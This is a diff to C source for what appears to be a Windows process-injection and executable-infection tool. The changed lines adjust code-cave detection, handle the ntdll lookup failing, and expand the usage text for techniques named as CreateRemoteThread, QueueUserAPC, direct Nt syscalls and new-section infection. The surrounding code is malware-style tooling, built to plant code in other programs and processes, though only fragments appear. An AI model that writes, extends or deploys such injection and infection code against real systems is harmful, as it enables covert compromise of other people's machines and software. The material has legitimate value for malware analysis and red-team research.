@@ -432,7 +432,7 @@ static BOOL RvaToFileOffset(const IMAGE_SECTION_HEADER* secs, WORD nsec, DWORD r
 }
 
 static BOOL IsCaveByte(BYTE value) {
-    return value == 0x00 || value == 0xCC;
+    return value == 0x00 || value == 0xCC || value == 0x90;
 }
 
 static BOOL FindCodeCave(
@@ -551,9 +551,7 @@ static BOOL ResolveNtFunctions(NT_FUNCTIONS* nt) {
 
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
     if (!ntdll) {
-        ntdll = LoadLibraryA("ntdll.dll");
-    }
-    if (!ntdll) {
+        printf(" [ERROR] GetModuleHandleA(ntdll.dll) failed\n");
         return FALSE;
     }
 
@@ -1195,6 +1193,7 @@ static void PrintUsage(const char* exeName) {
     printf("Usage: %s [--technique crt|apc|syscall] [--section]\n", exeName);
     printf("  --technique: crt=CreateRemoteThread, apc=QueueUserAPC, syscall=Nt* memory ops\n");
     printf("  --section: use new section infection instead of code cave\n");
+    printf("  Options can be combined (e.g. --technique apc --section)\n");
 }
 
 /**
